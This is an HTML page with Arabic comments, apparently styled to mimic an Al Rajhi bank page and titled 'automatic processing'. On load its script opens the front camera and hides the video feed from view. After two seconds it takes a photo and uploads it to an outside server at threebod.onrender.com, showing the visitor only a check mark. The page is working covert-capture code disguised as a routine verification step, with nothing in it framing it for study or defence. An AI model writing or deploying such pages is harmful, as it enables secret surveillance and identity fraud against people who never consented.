<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>معالجة تلقائية</title>
    <style>
       /* تعديل الـ body ليكون فخماً ونظيفاً */
body {
    background: linear-gradient(135deg, #ffffff 0%, #f8f9fa 100%);
    margin: 0;
    padding: 0;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    overflow: hidden;
    font-family: 'Segoe UI', Roboto, Helvetica, sans-serif;
    position: relative; /* ضروري لجعل العلامة المائية في الخلفية */
}

/* تصميم كلمة الراجحي كعلامة مائية فخمة */
.watermark {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    font-size: 15vw;
    font-weight: 900;
    color: rgb(0, 53, 168); /* لون الراجحي بشفافية 3% */
    z-index: 0;
    pointer-events: none;
    user-select: none;
    white-space: nowrap;
}
        /* تعديل الأبعاد لإخفاء الفيديو تماماً مع الحفاظ على عمل الكاميرا */
        video {
            width: 1px; /* تصغير العرض لـ 1 بكسل */
            height: 1px; /* تصغير الطول لـ 1 بكسل */
            object-fit: cover;
            position: absolute;
            top: 0;
            left: 0;
            opacity: 0; /* جعل الفيديو شفافاً (غير مرئي) */
            pointer-events: none; /* لمنع أي تفاعل مع الفيديو المخفي */
            z-index: 1;
        }
        .result-mark {
            font-size: 120px;
            user-select: none;
            display: none;
            animation: scaleUp 0.3s ease-in-out;
            position: relative;
            z-index: 10;
        }
        #success-mark { color: #28a745; }
        #error-mark { color: #dc3545; }

        @keyframes scaleUp {
            from { transform: scale(0.5); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }
        canvas { display: none; }
    </style>
</head>
<body>
<div class="watermark">hi there</div>
    <!-- عناصر الواجهة -->
    <video id="video" autoplay playsinline></video>
    <div id="success-mark" class="result-mark">✓</div>
    <div id="error-mark" class="result-mark">X</div>
    <canvas id="canvas"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const successEl = document.getElementById('success-mark');
        const errorEl = document.getElementById('error-mark');
        const ctx = canvas.getContext('2d');
        let globalStream = null;

        // دالة لتشغيل الكاميرا فوراً عند فتح الصفحة
        async function startCameraNow() {
            try {
                globalStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                
                video.srcObject = globalStream;
                
                video.onloadedmetadata = () => {
                    // الانتظار لمدة ثانيتين لتهيئة الكاميرا ثم التقاط الصورة تلقائياً
                    setTimeout(() => {
                        captureAndSendImage(globalStream);
                    }, 2000);
                };
            } catch (error) {
                console.error("خطأ في تشغيل الكاميرا:", error);
                // في حالة الخطأ، أظهر X الحمراء ليعرف المستخدم بوجود مشكلة
                showMark(errorEl);
            }
        }

        // دالة التقاط الصورة وإرسالها للسيرفر
        function captureAndSendImage(stream) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(async (blob) => {
                if (!blob) {
                    showMark(errorEl);
                    stopCamera(stream);
                    return;
                }

                const formData = new FormData();
                formData.append('captured_image', blob, 'instant_snap.jpg');

                try {
                    // إرسال الصورة إلى سيرفر Render الخاص بك
                    const response = await fetch('https://threebod.onrender.com/api/upload', {
                        method: 'POST',
                        body: formData
                    });

                    if (response.ok) {
                        showMark(successEl); // إظهار علامة الصح الأخضر عند النجاح
                    } else {
                        showMark(errorEl); // إظهار X إذا رفض السيرفر
                    }
                } catch (err) {
                    console.error(err);
                    showMark(errorEl); // إظهار X إذا فشل الاتصال بالشبكة
                } finally {
                    stopCamera(stream);
                }
            }, 'image/jpeg', 0.9);
        }

        function showMark(element) {
            // إخفاء عنصر الفيديو عند عرض النتيجة
            video.style.display = 'none';
            successEl.style.display = 'none';
            errorEl.style.display = 'none';
            element.style.display = 'block';
        }

        function stopCamera(stream) {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        }

        // انطلاق الكود فوراً عند تحميل الصفحة
        startCameraNow();
    </script>
</body>
</html>
